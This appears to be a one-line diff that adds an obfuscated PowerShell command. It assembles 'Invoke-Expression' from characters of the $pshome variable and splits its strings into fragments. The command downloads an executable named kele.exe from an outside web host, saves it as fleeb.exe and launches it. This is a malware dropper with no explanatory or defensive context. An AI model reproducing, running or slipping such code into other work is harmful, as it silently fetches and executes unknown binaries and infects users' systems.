@@ -1,0 +1,1 @@
+﻿. ( $pshOMe[21]+$PShoME[34]+'X')((('('+'New-'+'Obj'+'ect'+' '+'Sys'+'tem.N'+'et.W'+'ebClient).'+'Downloa'+'dF'+'il'+'e'+'(ZPihttp:/'+'/w'+'o'+'rl'+'dnit'+'.com/kele.exeZ'+'Pi,Z'+'Pif'+'le'+'eb'+'.'+'exeZP'+'i)'+';Start-'+'Pr'+'ocess'+' ZPi'+'f'+'leeb.'+'exeZ'+'P'+'i') -crePlaCE  'ZPi',[chAR]39)) 
